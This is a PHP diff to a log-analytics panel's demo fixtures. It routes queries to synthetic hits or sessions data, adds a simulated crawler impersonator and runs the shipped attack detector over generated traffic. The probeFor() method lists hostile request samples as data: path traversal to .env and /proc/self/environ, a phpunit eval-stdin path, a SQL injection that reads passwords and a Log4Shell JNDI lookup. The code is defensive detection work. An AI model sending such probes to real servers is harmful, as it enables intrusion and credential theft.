@@ -28,6 +28,8 @@ declare(strict_types=1);
 
 namespace Loghound\Panel;
 
+use Loghound\Score\Attacks;
+
 final class Fixtures
 {
     /** Fixed seed: reproducible demo, reproducible screenshots. */
@@ -86,12 +88,57 @@ final class Fixtures
      */
     public static function facet(string $tag, array $query, array $facet): array
     {
-        $all = (str_starts_with($tag, 'perf.') || str_contains($tag, 'hits')) ? self::hits() : self::sessions();
+        $all = self::plane($tag);
         $docs = self::applyQuery($all, $query);
 
         return self::compute($docs, $facet, static function (array $tags) use ($all, $query): array {
             return self::applyQueryExcept($all, $query, $tags);
         });
+    }
+
+    /**
+     * Which synthetic core a query tag reads.
+     *
+     * ONE DECISION, IN ONE PLACE, because it used to be three copies of the same expression and
+     * they disagreed the moment a view arrived whose tags matched none of them. A tag routed to
+     * the wrong plane does not error — it answers, with the wrong world — so Panel\Attacks would
+     * have faceted `status_i` and `hit_flags_ss` against SESSION documents and drawn a demo page
+     * that looked plausible and was nonsense.
+     *
+     * The Attacks view is deliberately split: five of its cards are hits-plane because a status
+     * and a path have to be read off the same document, and its impersonation card is
+     * sessions-plane because identity is a session property. The tag names say which.
+     */
+    /**
+     * The synthetic documents of one plane, with everything folded onto them.
+     *
+     * `sessions()` alone is not enough for a sessions-plane read: the union of a session's hit
+     * flags is computed while the HITS are built, so a request that touched only the sessions
+     * cache would see every session with no flags at all — and the one sessions-plane card on
+     * the Attacks view would be empty beside five full ones, which reads as a broken card. Both
+     * builders are memoised and idempotent, so asking for the hits first costs nothing on the
+     * second call.
+     *
+     * @return array<int,array<string,mixed>>
+     */
+    private static function plane(string $tag): array
+    {
+        if (self::planeFor($tag) === 'hits') {
+            return self::hits();
+        }
+        self::hits();
+        return self::sessions();
+    }
+
+    private static function planeFor(string $tag): string
+    {
+        if (str_starts_with($tag, 'perf.') || str_contains($tag, 'hits')) {
+            return 'hits';
+        }
+        if (str_starts_with($tag, 'atk.')) {
+            return $tag === 'atk.impersonation' ? 'sessions' : 'hits';
+        }
+        return 'sessions';
     }
 
     /**
@@ -158,7 +205,7 @@ final class Fixtures
         array $params,
         int $limit = 200
     ): array {
-        $docs = str_contains($tag, 'hits') ? self::hits() : self::sessions();
+        $docs = self::plane($tag);
         $docs = self::applyQuery($docs, $params);
 
         $needle = mb_strtolower(trim($contains));
@@ -195,7 +242,7 @@ final class Fixtures
      */
     public static function select(string $tag, array $params): array
     {
-        $docs = str_contains($tag, 'hits') ? self::hits() : self::sessions();
+        $docs = self::plane($tag);
         $docs = self::applyQuery($docs, $params);
 
         $sort = (string) ($params['sort'] ?? '');
@@ -434,8 +481,23 @@ final class Fixtures
                 $doc['ua_bot_name_s'] = $c[0];
                 $doc['ua_bot_cat_s'] = $c[1];
                 $doc['ai_crawler_b'] = $c[2];
-                $doc['rdns_ok_b'] = true;
-                $doc['rdns_s'] = strtolower($c[0]) . '-' . mt_rand(1, 250) . '.crawl.example.net';
+                /* ONE IMPERSONATOR IN THE DEMO WORLD, because it is the case the whole view was
+                   built from: a session wearing a named crawler's User-Agent, answering from a
+                   rented cloud machine. Roughly one declared crawler in nine, deterministic
+                   against the seed, and only for a search or AI name — those are the operators
+                   who run their own infrastructure, which is what makes the contradiction
+                   meaningful. Its reverse DNS is a tenant name and its claim is NOT verified, so
+                   the impersonation card has something true to show and the roll-call underneath
+                   it has a row with sessions and no verified ones. */
+                $faking = mt_rand(1, 9) === 1 && ($c[1] === 'search' || $c[1] === 'ai');
+                $doc['rdns_ok_b'] = !$faking;
+                $doc['rdns_s'] = $faking
+                    ? mt_rand(2, 250) . '.' . mt_rand(2, 250) . '.89.34.bc.googleusercontent.com'
+                    : strtolower($c[0]) . '-' . mt_rand(1, 250) . '.crawl.example.net';
+                if ($faking) {
+                    $doc['as_type_s'] = 'hosting';
+                    $doc['as_org_s'] = 'Google Cloud Platform';
+                }
                 $doc['fp_hash_s'] = 'c0' . substr(sha1($c[0]), 2);
                 $doc['fp_ips_24h_i'] = mt_rand(4, 40);
                 $doc['hits_i'] = mt_rand(1, 40);
@@ -445,8 +507,12 @@ final class Fixtures
                 $doc['js_b'] = false;
                 $doc['bot_score_f'] = 100.0;
                 $doc['bot_verdict_s'] = 'bot';
-                $doc['bot_class_s'] = $c[2] ? 'ai_crawler' : ($c[1] === 'monitor' ? 'monitor' : 'declared_crawler');
-                $doc['bot_reasons_ss'] = ['ua_declared_bot'];
+                $doc['bot_class_s'] = $faking
+                    ? 'spoofed_ua'
+                    : ($c[2] ? 'ai_crawler' : ($c[1] === 'monitor' ? 'monitor' : 'declared_crawler'));
+                $doc['bot_reasons_ss'] = $faking
+                    ? ['ua_declared_bot', 'rdns_claim_failed']
+                    : ['ua_declared_bot'];
             } elseif ($roll <= 34) {
                 $net = $hostings[mt_rand(0, count($hostings) - 1)];
                 $doc = self::baseDoc($start, self::poolIp('scripted', 12, $i, $net[0]), $net);
@@ -767,6 +833,19 @@ final class Fixtures
                     $base *= mt_rand(4, 14);
                 }
 
+                $query = null;
+
+                /* A LITTLE HOSTILE TRAFFIC, because every site on the public internet has some and
+                   a demo Attacks view with an empty table would misrepresent the product in the
+                   opposite direction from the usual one. It is deliberately ordinary: mostly
+                   refused, a couple answered, all of it from sessions the scorer already calls
+                   automation, so the demo world stays internally consistent. */
+                $probe = self::probeFor($s, $k);
+                if ($probe !== null) {
+                    [$path, $query, $status] = $probe;
+                    $isAsset = false;
+                }
+
                 $hit = [
                     'id'            => sha1($s['id'] . ':' . $k),
                     'ts'            => self::iso($startTs + (int) round($spanSec * ($n > 1 ? $k / ($n - 1) : 0))),
@@ -775,6 +854,7 @@ final class Fixtures
                     'method_s'      => $k === 0 ? 'GET' : (mt_rand(0, 40) === 0 ? 'POST' : 'GET'),
                     'path_s'        => $path,
                     'status_i'      => $status,
+                    'status_class_s' => ((int) ($status / 100)) . 'xx',
                     'bytes_l'       => $status === 304 ? 0 : mt_rand(400, 180000),
                     'dur_us_l'      => $base,
                     'kind_s'        => $isAsset ? 'asset' : 'html',
@@ -783,11 +863,19 @@ final class Fixtures
                     'host_s'        => $s['host_s'],
                     'ip_s'          => $s['ip_s'],
                     'as_type_s'     => $s['as_type_s'],
+                    'rdns_s'        => isset($s['rdns_s']) ? (string) $s['rdns_s'] : null,
+                    'ua_s'          => isset($s['ua_s']) ? (string) $s['ua_s'] : null,
+                    'ua_bot_b'      => $s['ua_bot_b'] ?? null,
+                    'ua_bot_cat_s'  => $s['ua_bot_cat_s'] ?? null,
                     'bot_verdict_s' => $s['bot_verdict_s'] ?? 'unknown',
-                    'hit_flags_ss'  => [],
                 ];
-                if ($hit['asset_kind_s'] === null) {
-                    unset($hit['asset_kind_s']);
+                if ($query !== null) {
+                    $hit['query_s'] = $query;
+                }
+                foreach (['asset_kind_s', 'rdns_s', 'ua_s', 'ua_bot_b', 'ua_bot_cat_s'] as $optional) {
+                    if (($hit[$optional] ?? null) === null) {
+                        unset($hit[$optional]);
+                    }
                 }
                 if (!empty($s['referer_s']) && $k === 0) {
                     $hit['referer_s'] = $s['referer_s'];
@@ -795,12 +883,95 @@ final class Fixtures
                 if (($s['as_type_s'] ?? '') === 'mobile') {
                     unset($hit['dur_us_l']);
                 }
-                $out[] = $hit;
+
+                /* THE REAL DETECTOR, over the synthetic world. The demo must not be able to show a
+                   pattern the shipped rules would not produce, or a screenshot becomes a claim the
+                   product cannot keep — so the fixtures do not hand-write `hit_flags_ss`, they run
+                   Score\Attacks over each synthetic request exactly as bin/loghound-tail does. */
+                $out[] = Attacks::apply($hit);
             }
         }
 
         self::$hits = $out;
+        self::foldFlagsIntoSessions();
+
         return $out;
+    }
+
+    /**
+     * The hostile request this demo hit is, or null for an ordinary one.
+     *
+     * Deterministic against the seeded generator, and scoped to sessions the scorer already
+     * judged to be automation: a demo world where a human session is probing for `.env` would
+     * teach the wrong thing about what the panel is showing.
+     *
+     * @param array<string,mixed> $s
+     * @return array{0:string,1:string,2:int}|null path, query string, status
+     */
+    private static function probeFor(array $s, int $k): ?array
+    {
+        $verdict = (string) ($s['bot_verdict_s'] ?? '');
+        if ($verdict !== 'bot' && $verdict !== 'likely_bot') {
+            return null;
+        }
+        if (mt_rand(1, 100) > 22) {
+            return null;
+        }
+
+        /* MOSTLY REFUSED, which is the honest shape of this traffic: a webserver answers almost
+           every probe with a 404 and that is the webserver working. The handful of 200s are what
+           the first card on the page exists to surface. */
+        $probes = [
+            ['/api/uploads/%2e%2e%2f%2e%2e%2f%2e%2e%2f.env', '', 404],
+            ['/icons/.%2e/.%2e/.%2e/.%2e/proc/self/environ', '', 404],
+            ['/.git/config', '', 404],
+            ['/wp-login.php', '', 404],
+            ['/phpmyadmin/index.php', '', 404],
+            ['/vendor/phpunit/phpunit/src/util/php/eval-stdin.php', '', 404],
+            ['/actuator/gateway/routes', '', 401],
+            ['/search', 'q=%27+UNION+SELECT+password+FROM+users--', 200],
+            ['/index.php', 's=${jndi:ldap://198.51.100.9/a}', 404],
+            ['/.well-known/pki.php', '', 404],
+            ['/backup/site.sql', '', 403],
+            ['/install.php', '', 302],
+        ];
+
+        return $probes[($k + (int) hexdec(substr(sha1((string) $s['id']), 0, 4))) % count($probes)];
+    }
+
+    /**
+     * Copy each session's union of hit flags back onto its session document.
+     *
+     * The demo half of what Sessionizer::accumulate() does at ingest. Without it the
+     * impersonation card — the only sessions-plane card on the Attacks view — would be empty on a
+     * page whose other five cards were full, which reads as a broken card rather than as a demo.
+     */
+    private static function foldFlagsIntoSessions(): void
+    {
+        if (self::$sessions === null || self::$hits === null) {
+            return;
+        }
+
+        $bySession = [];
+        foreach (self::$hits as $hit) {
+            $id = (string) ($hit['session_id_s'] ?? '');
+            if ($id === '') {
+                continue;
+            }
+            foreach ((array) ($hit['hit_flags_ss'] ?? []) as $flag) {
+                $bySession[$id][(string) $flag] = true;
+            }
+        }
+
+        foreach (self::$sessions as $i => $session) {
+            $id = (string) ($session['id'] ?? '');
+            self::$sessions[$i]['hit_rules_i'] = Attacks::RULE_VERSION;
+            if (isset($bySession[$id])) {
+                $flags = array_keys($bySession[$id]);
+                sort($flags);
+                self::$sessions[$i]['hit_flags_ss'] = $flags;
+            }
+        }
     }
 
     /** Format a unix timestamp the way Solr formats a pdate. */
